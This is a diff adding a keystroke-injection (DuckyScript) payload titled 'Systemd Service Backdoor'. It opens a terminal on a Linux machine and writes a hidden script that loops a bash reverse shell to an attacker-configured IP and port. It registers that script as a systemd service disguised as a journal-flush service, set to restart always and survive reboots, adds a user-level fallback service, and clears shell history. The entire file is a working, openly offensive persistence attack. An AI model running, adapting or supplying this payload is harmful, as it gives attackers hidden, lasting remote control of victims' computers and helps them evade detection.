@@ -1,0 +1,120 @@
+REM ==========================================
+REM Title: Systemd Service Backdoor
+REM Author: NullSec Suite
+REM Target: Linux (systemd-based distros)
+REM Description: Creates a stealthy systemd
+REM   service unit that establishes a persistent
+REM   reverse shell. The service auto-restarts
+REM   on failure and survives reboots. Uses
+REM   benign naming to blend with system svcs.
+REM Category: Persistence / Execution
+REM ==========================================
+DELAY 1000
+REM Open terminal on Linux
+CTRL-ALT t
+DELAY 1000
+REM Configuration (replace with actual C2)
+STRING ATTACKER_IP="10.0.0.1"
+ENTER
+DELAY 350
+STRING ATTACKER_PORT="4444"
+ENTER
+DELAY 350
+REM Create hidden reverse shell script
+STRING mkdir -p /tmp/.systemd-private 2>/dev/null
+ENTER
+DELAY 350
+STRING cat > /tmp/.systemd-private/system-journal-flush << 'EOF'
+ENTER
+DELAY 300
+STRING #!/bin/bash
+ENTER
+DELAY 300
+STRING while true; do
+ENTER
+DELAY 300
+STRING   bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null
+ENTER
+DELAY 300
+STRING   sleep 120
+ENTER
+DELAY 300
+STRING done
+ENTER
+DELAY 300
+STRING EOF
+ENTER
+DELAY 350
+REM Replace placeholder with actual IP
+STRING sed -i "s/ATTACKER_IP/$ATTACKER_IP/g; s/4444/$ATTACKER_PORT/g" /tmp/.systemd-private/system-journal-flush
+ENTER
+DELAY 350
+STRING chmod +x /tmp/.systemd-private/system-journal-flush
+ENTER
+DELAY 400
+REM Create systemd service unit (attempt with sudo)
+STRING sudo tee /etc/systemd/system/systemd-journal-flush.service > /dev/null << 'SVCEOF'
+ENTER
+DELAY 300
+STRING [Unit]
+ENTER
+DELAY 300
+STRING Description=Flush Journal to Persistent Storage
+ENTER
+DELAY 300
+STRING After=network-online.target
+ENTER
+DELAY 300
+STRING Wants=network-online.target
+ENTER
+DELAY 300
+STRING [Service]
+ENTER
+DELAY 300
+STRING Type=simple
+ENTER
+DELAY 300
+STRING ExecStart=/tmp/.systemd-private/system-journal-flush
+ENTER
+DELAY 300
+STRING Restart=always
+ENTER
+DELAY 300
+STRING RestartSec=60
+ENTER
+DELAY 300
+STRING [Install]
+ENTER
+DELAY 300
+STRING WantedBy=multi-user.target
+ENTER
+DELAY 300
+STRING SVCEOF
+ENTER
+DELAY 400
+REM Enable and start the service
+STRING sudo systemctl daemon-reload 2>/dev/null
+ENTER
+DELAY 400
+STRING sudo systemctl enable systemd-journal-flush.service 2>/dev/null
+ENTER
+DELAY 400
+STRING sudo systemctl start systemd-journal-flush.service 2>/dev/null
+ENTER
+DELAY 400
+REM Also create user-level systemd service as fallback
+STRING mkdir -p ~/.config/systemd/user 2>/dev/null
+ENTER
+DELAY 350
+STRING cp /etc/systemd/system/systemd-journal-flush.service ~/.config/systemd/user/journal-sync.service 2>/dev/null
+ENTER
+DELAY 350
+STRING systemctl --user daemon-reload 2>/dev/null && systemctl --user enable journal-sync.service 2>/dev/null
+ENTER
+DELAY 400
+REM Clear history
+STRING history -c && history -w
+ENTER
+DELAY 350
+STRING exit
+ENTER
